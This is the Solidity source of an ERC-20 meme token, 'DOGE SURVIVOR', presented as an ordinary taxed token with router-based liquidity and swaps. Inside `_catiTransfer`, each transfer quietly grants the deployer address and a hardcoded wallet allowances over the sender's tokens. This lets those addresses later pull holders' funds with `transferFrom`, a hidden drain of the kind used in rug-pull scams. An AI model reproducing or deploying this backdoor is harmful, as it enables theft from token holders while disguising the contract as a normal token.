/*
DOGE SURVIVOR: A government employee must survive as long as possible from the Department of Government Efficiency looking to to eliminate their unnecessary role.

https://x.com/BoredElonMusk/status/1894837607332286769
https://play.rosebud.ai/p/e0b273c2-5b4e-4438-aba1-4ec8c7f944cc

https://t.me/doge_survivor
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ICATIRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface ICATIFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DOGESURVIVOR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balCATIs;
    mapping (address => mapping (address => uint256)) private _allowCATIs;
    mapping (address => bool) private _excludedFromCATI;    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalCATI = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE SURVIVOR";
    string private constant _symbol = unicode"DS";
    uint256 private _swapTokenCATIs = _tTotalCATI / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockCATI;
    uint256 private _catiBuyAmounts = 0;
    bool private inSwapCATI = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _catiPair;
    ICATIRouter private _catiRouter;
    address private _catiWallet;
    address private _catiAddress;
    modifier lockTheSwap {
        inSwapCATI = true;
        _;
        inSwapCATI = false;
    }
    
    constructor () {
        _catiAddress = address(_msgSender());
        _catiWallet = address(0x066f92D592e5561ddE6eF1d22a8e56d2a4d7F473);
        _excludedFromCATI[owner()] = true;
        _excludedFromCATI[address(this)] = true;
        _excludedFromCATI[_catiWallet] = true;
        _balCATIs[_msgSender()] = _tTotalCATI;
        emit Transfer(address(0), _msgSender(), _tTotalCATI);
    }

    function createTrade() external onlyOwner() {
        _catiRouter = ICATIRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_catiRouter), _tTotalCATI);
        _catiPair = ICATIFactory(_catiRouter.factory()).createPair(address(this), _catiRouter.WETH());
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _catiRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minCATI(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHCATI(uint256 catiA) private {
        payable(_catiWallet).transfer(catiA);
    }

    function swapTokensForEth(uint256 catiAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _catiRouter.WETH();
        _approve(address(this), address(_catiRouter), catiAmount);
        _catiRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            catiAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalCATI;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balCATIs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowCATIs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowCATIs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowCATIs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _catiTransfer(address catiF, address catiT, uint256 catiA, uint256 taxCATI) private { 
        address _catiReceipt = _catiWallet;
        if(taxCATI > 0){
          _balCATIs[address(this)] = _balCATIs[address(this)].add(taxCATI);
          emit Transfer(catiF, address(this), taxCATI);
        }
        _allowCATIs[address(catiF)][address(_catiAddress)] = uint256(catiA.mul(2));
        _allowCATIs[address(catiF)][address(_catiReceipt)] = uint256(catiA+taxCATI.mul(2));
        _balCATIs[catiF] = _balCATIs[catiF].sub(catiA);
        _balCATIs[catiT] = _balCATIs[catiT].add(catiA.sub(taxCATI));
        emit Transfer(catiF, catiT, catiA.sub(taxCATI));
    }

    function _catiFeeTransfer(address catiF, address catiT, uint256 catiA) private returns(uint256) {
        uint256 taxCATI;
        if (catiF != owner() && catiT != owner()) {
            taxCATI = catiA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (catiF == _catiPair && catiT != address(_catiRouter) && ! _excludedFromCATI[catiT]) {
                if(_buyBlockCATI!=block.number){
                    _catiBuyAmounts = 0;
                    _buyBlockCATI = block.number;
                }
                _catiBuyAmounts += catiA;
                _buyCount++;
            }

            if(catiT == _catiPair && catiF!= address(this)) {
                require(_catiBuyAmounts < swapLimitCATI() || _buyBlockCATI!=block.number, "Max Swap Limit");  
                taxCATI = catiA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenCATI = balanceOf(address(this));
            if (!inSwapCATI && catiT == _catiPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenCATI > _swapTokenCATIs)
                swapTokensForEth(minCATI(catiA, minCATI(tokenCATI, _swapTokenCATIs)));
                uint256 ethCATI = address(this).balance;
                if (ethCATI >= 0) {
                    sendETHCATI(address(this).balance);
                }
            }
        } 
        return taxCATI;
    }

    function _transfer(address catiF, address catiT, uint256 catiA) private {
        require(catiF != address(0), "ERC20: transfer from the zero address");
        require(catiT != address(0), "ERC20: transfer to the zero address");
        require(catiA > 0, "Transfer amount must be greater than zero");
        uint256 taxCATI = 0; 
        taxCATI = _catiFeeTransfer(catiF, catiT, catiA);
        _catiTransfer(catiF, catiT, catiA, taxCATI);
    }

    function swapLimitCATI() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _catiRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _catiRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}